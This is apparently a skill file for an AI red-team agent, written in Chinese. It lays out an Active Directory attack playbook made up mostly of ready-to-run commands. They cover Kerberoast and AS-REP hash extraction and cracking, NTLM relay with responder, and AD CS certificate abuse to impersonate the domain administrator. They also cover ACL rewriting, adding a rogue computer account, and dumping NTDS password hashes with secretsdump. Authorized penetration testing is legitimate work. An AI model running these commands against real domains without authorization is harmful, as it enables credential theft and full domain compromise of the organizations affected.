---
name: ad-attack
description: Active Directory 侦察与攻击：无凭据枚举、Kerberoast、AS-REP、ACL 滥用、AD CS 证书攻击、NTLM 中继
whenToUse: 内网有域、拿到任意域内账号（哪怕普通用户）、或发现 88/389/636/445/5985 开放
role: exploit
enabled: true
---

# Active Directory

## 无凭据阶段

```bash
# 域名与 DC
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN
nmap -p 88,389,445,636,3268,5985 -sV DC_IP

# 匿名/空会话（越来越少，但先试）
impacket-GetNPUsers DOMAIN/ -no-pass -dc-ip DC_IP -usersfile users.txt   # AS-REP 可爆破账号
ldapsearch -x -H ldap://DC_IP -b "dc=DOMAIN,dc=local" "(objectClass=user)" sAMAccountName
```

## 有凭据（普通用户即可）

```bash
# 1. 全量用户/组/信任
impacket-GetADUsers DOMAIN/user:pass -dc-ip DC_IP -all
bloodhound-python -u user -p pass -d DOMAIN -ns DC_IP -c All    # 出 zip 给 BloodHound

# 2. Kerberoast：有 SPN 的服务账号，离线爆破
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt wordlist.txt -O

# 3. AS-REP Roast：不需要预认证的账号
impacket-GetNPUsers DOMAIN/user:pass -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt -O

# 4. 委派
impacket-findDelegation DOMAIN/user:pass -dc-ip DC_IP

# 5. SMB 签名关闭 → NTLM 中继
nmap -p 445 --script smb2-security-mode DC_IP
responder -I INTERFACE -wv        # 抓
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```

## AD CS（证书服务，最常见的一条通天路）

```bash
certipy-ad find -u user@DOMAIN -p pass -dc-ip DC_IP -vulnerable -stdout
# ESC1: 模板允许请求者指定 SAN
certipy-ad req -u user@DOMAIN -p pass -ca CA_NAME -template VULN_TEMPLATE -upn administrator@DOMAIN
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
# ESC8: HTTP 端点 + 中继
certipy-ad relay -target http://CA_HOST/certsrv/certfnsh.asp -template DomainController
```

## ACL 滥用（BloodHound 给路径，impacket 执行）

```bash
impacket-dacledit -action write -rights FullControl -principal user -target victim DOMAIN/user:pass -dc-ip DC_IP
impacket-addcomputer DOMAIN/user:pass -computer-name EVIL$ -computer-pass P@ss -dc-ip DC_IP
impacket-GetUserSPNs / secretsdump.py 走完拿 NTDS
impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc-ntlm
```

## 判据

- Kerberoast：拿到 `$krb5tgs$` 开头哈希 = true；爆破出明文才算 "拿凭据"
- 不要为了"打穿"去改生产 ACL，除非目标就是 DC 且已记录回滚点
- 每一步落 `redteam_credential_add` + `redteam_access_add`，写明来源与可用范围
